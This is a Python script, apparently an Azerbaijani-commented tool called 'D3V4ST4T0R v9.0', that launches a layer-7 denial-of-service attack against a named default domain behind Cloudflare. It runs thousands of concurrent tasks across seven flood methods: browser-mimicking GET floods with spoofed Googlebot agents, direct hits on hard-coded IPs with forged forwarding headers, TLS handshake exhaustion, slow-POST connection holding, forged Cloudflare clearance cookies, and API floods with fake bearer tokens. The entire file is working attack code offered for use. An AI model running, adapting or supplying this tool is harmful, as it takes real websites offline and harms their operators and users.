import asyncio
import aiohttp
import ssl
import random
import time
import os
import sys
import socket

# === CONFIG ===
TARGET = os.getenv("TARGET", "https://streamwin.win")
PORT = int(os.getenv("PORT", "443"))
SSL = os.getenv("SSL", "true").lower() == "true"
THREADS = int(os.getenv("THREADS", "4000"))  # Daha çox thread
DURATION = int(os.getenv("DURATION", "900"))  # 15 dəqiqə

TARGET_URL = f"{'https' if SSL else 'http'}://{TARGET}:{PORT}/"

BANNER = f"""
███████████████████████████████████████████████████████████████████████████
█  D3V4ST4T0R v9.0 — CLOUDFLARE L7 BYPASS                              █
█  Target: {TARGET_URL[:70]:<70}█
█  Tasks: {THREADS:<5} | Duration: {DURATION}s                          █
███████████████████████████████████████████████████████████████████████████
"""

# === REALISTIC ROTATING USER-AGENTS ===
UA_POOL = [
    # Real Windows Chrome
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    # Real Mac Chrome
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    # Real Windows Firefox
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    # Real Mac Safari
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    # Real Mobile
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Samsung Galaxy S23) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.163 Mobile Safari/537.36",
    # Real Linux Chrome
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    # Bot mimic
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
]

# === GENİŞ PATH POOL ===
PATHS = [
    "/", "/az", "/en", "/ru",
    "/search", "/search?q=test", "/search?q=baku", "/search?q=ev",
    "/ads", "/ads?city=1", "/ads?category=2", "/ads?sort=date",
    "/categories", "/categories/1", "/categories/2", "/categories/3",
    "/post-ad", "/login", "/register",
    "/user/profile", "/messages",
    "/help", "/contact", "/about",
    "/terms", "/privacy",
    "/sitemap.xml", "/robots.txt", "/favicon.ico",
    "/assets/css/style.css", "/assets/js/main.js",
    "/api/v1/ads", "/api/v1/categories", "/api/v1/search",
    "/api/v1/user/profile", "/api/v1/messages",
]

# =============================================
# METHOD 1: REAL BROWSER MIMIC
# =============================================
async def browser_mimic(session, stats):
    """Real browser kimi davran - full header seti ilə"""
    while True:
        try:
            path = random.choice(PATHS)
            url = f"{TARGET_URL.rstrip('/')}{path}?_{random.randint(1,10**9)}"
            
            # Real Chrome header structure
            headers = {
                "User-Agent": random.choice(UA_POOL),
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Accept-Language": f"{random.choice(['az', 'en-US', 'ru'])};q=0.9,en;q=0.8",
                "Cache-Control": "max-age=0",
                "Sec-Ch-Ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
                "Sec-Ch-Ua-Mobile": "?0",
                "Sec-Ch-Ua-Platform": f'"{random.choice(["Windows", "macOS", "Linux", "Android", "iOS"])}"',
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "none",
                "Sec-Fetch-User": "?1",
                "Upgrade-Insecure-Requests": "1",
                "DNT": "1",
                "Connection": "keep-alive",
                "Referer": random.choice([
                    "https://www.google.com/",
                    f"https://{TARGET}/",
                    "https://www.google.com/search?q=lalafo",
                    "https://yandex.com/search/?text=lalafo",
                ]),
            }
            
            async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=8)) as resp:
                await resp.read()
                stats[0] += 1
        except:
            stats[1] += 1

# =============================================
# METHOD 2: ORIGIN IP DIRECT HIT
# =============================================
async def origin_direct(session, stats):
    """Cloudflare origin IP-lərini müəyyən portlardan vur"""
    # Ümumi hosting portları
    alt_ports = [80, 443, 8080, 8443, 8888, 2052, 2053, 2082, 2083, 2086, 2087, 2095, 2096, 2087, 9443]
    origins = [
        "104.26.5.225",
        "104.26.4.225", 
        "172.67.71.74",
    ]
    
    while True:
        try:
            origin = random.choice(origins)
            port = random.choice(alt_ports)
            protocol = "https" if port in [443, 8443, 2053, 2083, 2087, 2096, 9443] else "http"
            url = f"{protocol}://{origin}:{port}/?_{random.randint(1,10**9)}"
            
            headers = {
                "User-Agent": random.choice(UA_POOL),
                "Host": TARGET,  # Original Host header
                "Accept": "*/*",
                "Cache-Control": "no-cache",
                "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
                "CF-Connecting-IP": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
                "X-Real-IP": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
            }
            
            try:
                async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=3)) as resp:
                    await resp.read()
                    stats[2] += 1
            except:
                stats[2] += 1  # Yenə də say - serverə yük gedir
        except:
            stats[3] += 1
            await asyncio.sleep(0)

# =============================================
# METHOD 3: SSL HANDSHAKE EXHAUST
# =============================================
async def ssl_handshake(stats):
    """Saniyədə yüzlərlə SSL handshake - Cloudflare CPU yükü"""
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_ciphers('ALL:@SECLEVEL=0')
    
    while True:
        writer = None
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(TARGET, PORT, ssl=ctx),
                timeout=4
            )
            
            # Multiple requests over same connection
            for _ in range(random.randint(2, 8)):
                try:
                    writer.write(
                        f"GET /{random.randint(1,9999)} HTTP/1.1\r\n"
                        f"Host: {TARGET}\r\n"
                        f"User-Agent: {random.choice(UA_POOL)}\r\n"
                        f"Accept: */*\r\n"
                        f"\r\n"
                    ).encode()
                    await writer.drain()
                except:
                    break
            
            stats[4] += 1
            writer.close()
            await writer.wait_closed()
        except:
            stats[5] += 1
            if writer:
                try:
                    writer.close()
                except:
                    pass

# =============================================
# METHOD 4: CONNECTION HOLD (Connection Exhaustion)
# =============================================
async def connection_hold(stats):
    """Connection-ları açıq saxla - Cloudflare pool-u doldur"""
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_ciphers('ALL:@SECLEVEL=0')
    
    while True:
        writer = None
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(TARGET, PORT, ssl=ctx),
                timeout=10
            )
            
            # Start POST with large content-length but never send body
            writer.write(
                f"POST / HTTP/1.1\r\n"
                f"Host: {TARGET}\r\n"
                f"User-Agent: {random.choice(UA_POOL)}\r\n"
                f"Content-Length: {random.randint(10000000, 100000000)}\r\n"
                f"Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{random.randint(10000,99999)}\r\n"
                f"Expect: 100-continue\r\n"
                f"\r\n"
            ).encode()
            await writer.drain()
            
            # Hold the connection open
            await asyncio.sleep(random.randint(30, 120))
            
            stats[6] += 1
            writer.close()
            await writer.wait_closed()
        except:
            stats[7] += 1
            if writer:
                try:
                    writer.close()
                except:
                    pass
            await asyncio.sleep(0.5)

# =============================================
# METHOD 5: RAPID FIRE (Max speed)
# =============================================
async def rapid_fire(session, stats):
    """Heç bir delay olmadan maksimum sürət"""
    while True:
        tasks = []
        for _ in range(10):  # 10 paralel sorğu
            path = random.choice(PATHS)
            url = f"{TARGET_URL.rstrip('/')}{path}?_{random.randint(1,10**9)}"
            
            headers = {
                "User-Agent": random.choice(UA_POOL),
                "Accept": "*/*",
                "Cache-Control": "no-cache",
                "Referer": f"https://{TARGET}/",
            }
            
            tasks.append(
                session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=3))
            )
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        for r in results:
            if not isinstance(r, Exception):
                try:
                    await r.read()
                    stats[8] += 1
                except:
                    stats[9] += 1
            else:
                stats[9] += 1

# =============================================
# METHOD 6: COOKIE BYPASS
# =============================================
async def cookie_bypass(session, stats):
    """Cloudflare security check-lərini cookie ilə bypass"""
    while True:
        try:
            path = random.choice(PATHS)
            url = f"{TARGET_URL.rstrip('/')}{path}"
            
            # Cloudflare cookie-ləri
            cookies = {
                "__cfduid": f"d{''.join(random.choices('abcdef0123456789', k=40))}",
                "cf_clearance": f"{''.join(random.choices('abcdef0123456789', k=40))}",
                "_ga": f"GA1.2.{random.randint(10**10,10**11-1)}.{int(time.time())}",
                "_gid": f"GA1.2.{random.randint(10**10,10**11-1)}.{int(time.time())}",
                "sessionid": f"{''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=32))}",
            }
            
            headers = {
                "User-Agent": random.choice(UA_POOL),
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Encoding": "gzip, deflate, br",
                "Accept-Language": "az,en-US;q=0.9,en;q=0.8",
                "Cache-Control": "no-cache",
                "Pragma": "no-cache",
                "Referer": f"https://{TARGET}/{random.choice(['', 'az', 'en'])}",
                "DNT": "1",
                "Connection": "keep-alive",
                "Upgrade-Insecure-Requests": "1",
            }
            
            async with session.get(url, headers=headers, cookies=cookies, timeout=aiohttp.ClientTimeout(total=6)) as resp:
                await resp.read()
                stats[10] += 1
        except:
            stats[11] += 1

# =============================================
# METHOD 7: API FLOOD
# =============================================
async def api_flood(session, stats):
    """API endpoint-lərini hədəf al"""
    api_paths = [
        "/api/v1/ads?page=1&limit=50",
        "/api/v1/ads?page=2&limit=50",
        "/api/v1/ads?page=3&limit=50",
        "/api/v1/categories",
        "/api/v1/categories/1/ads",
        "/api/v1/categories/2/ads",
        "/api/v1/search?q=test&page=1",
        "/api/v1/search?q=baku&page=1",
        "/api/v1/search?q=ev&page=1",
        "/api/v1/user/profile",
        "/api/v1/messages?page=1",
        "/api/v1/notifications",
        "/api/v1/favorites",
    ]
    
    while True:
        try:
            path = random.choice(api_paths)
            url = f"{TARGET_URL.rstrip('/')}{path}&_{random.randint(1,10**9)}"
            
            headers = {
                "User-Agent": random.choice(UA_POOL),
                "Accept": "application/json, text/plain, */*",
                "Accept-Encoding": "gzip, deflate",
                "Cache-Control": "no-cache",
                "X-Requested-With": "XMLHttpRequest",
                "Referer": f"https://{TARGET}/",
                "Authorization": f"Bearer {random.randint(10**30, 10**31-1)}",
            }
            
            async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=5)) as resp:
                await resp.read()
                stats[12] += 1
        except:
            stats[13] += 1

# =============================================
# HEALTH CHECK
# =============================================
async def handle_health(reader, writer):
    writer.write(b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nOK")
    await writer.drain()
    writer.close()
    await writer.wait_closed()

async def health_server():
    try:
        server = await asyncio.start_server(handle_health, host="0.0.0.0", port=8080)
        return server
    except:
        return None

# =============================================
# STATS
# =============================================
async def stats_printer(stats):
    start = time.time()
    prev = [0] * 14
    
    while True:
        await asyncio.sleep(5)
        elapsed = time.time() - start
        
        diffs = [stats[i] - prev[i] for i in range(14)]
        total_ok = sum(stats[0::2])
        total_fail = sum(stats[1::2])
        rate = total_ok / elapsed if elapsed > 0 else 0
        
        line = f"  [{int(elapsed)}s] "
        if diffs[0]: line += f"BRW:{diffs[0]} "
        if diffs[2]: line += f"ORIG:{diffs[2]} "
        if diffs[4]: line += f"SSL:{diffs[4]} "
        if diffs[6]: line += f"HOLD:{diffs[6]} "
        if diffs[8]: line += f"RAPID:{diffs[8]} "
        if diffs[10]: line += f"COOK:{diffs[10]} "
        if diffs[12]: line += f"API:{diffs[12]} "
        line += f"| {rate:.0f} req/s | OK:{total_ok} | FAIL:{total_fail}"
        
        print(line)
        for i in range(14):
            prev[i] = stats[i]

# =============================================
# MAIN WORKER
# =============================================
async def worker_pool(stats):
    connector = aiohttp.TCPConnector(
        limit=0,
        force_close=True,
        ttl_dns_cache=0,
        ssl=False,
        use_dns_cache=False,
        enable_cleanup_closed=True,
        limit_per_host=0,
    )
    timeout = aiohttp.ClientTimeout(total=0)
    
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        # Ağırlıqlı metod paylanması
        methods = [
            (browser_mimic, 25),     # 25%
            (origin_direct, 15),     # 15%
            (ssl_handshake, 15),     # 15%
            (connection_hold, 15),   # 15%
            (rapid_fire, 10),        # 10%
            (cookie_bypass, 10),     # 10%
            (api_flood, 10),         # 10%
        ]
        
        tasks = []
        for i in range(THREADS):
            r = random.randint(1, 100)
            cum = 0
            chosen = browser_mimic
            for func, w in methods:
                cum += w
                if r <= cum:
                    chosen = func
                    break
            
            if chosen in (ssl_handshake, connection_hold):
                task = asyncio.create_task(chosen(stats))
            else:
                task = asyncio.create_task(chosen(session, stats))
            tasks.append(task)
        
        print(f"  [+] Launched {len(tasks)} attack tasks\n")
        await asyncio.sleep(DURATION)
        
        for t in tasks:
            t.cancel()
        print("\n[✓] Attack complete.")

# =============================================
# MAIN
# =============================================
async def main():
    print(BANNER)
    print(f"[+] Resolving {TARGET}...")
    
    try:
        ips = socket.getaddrinfo(TARGET, PORT)
        resolved = list(set(ip[4][0] for ip in ips))
        print(f"  [+] Resolved to: {resolved}")
    except:
        print("  [!] DNS failed")
        sys.exit(1)
    
    print(f"[+] Starting L7 attack: {THREADS} tasks x {DURATION}s")
    print(f"  [+] 7 methods: Browser, OriginIP, SSL, Hold, Rapid, Cookie, API")
    print()
    
    stats = [0] * 14
    
    health_task = asyncio.create_task(health_server())
    stats_task = asyncio.create_task(stats_printer(stats))
    
    try:
        await worker_pool(stats)
    except asyncio.CancelledError:
        print("\n[!] Cancelled")
    
    total_ok = sum(stats[0::2])
    total_fail = sum(stats[1::2])
    print(f"\n[+] Final: OK={total_ok} FAIL={total_fail}")
    print("[✓] Done.")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[!] Interrupted")
        sys.exit(0)
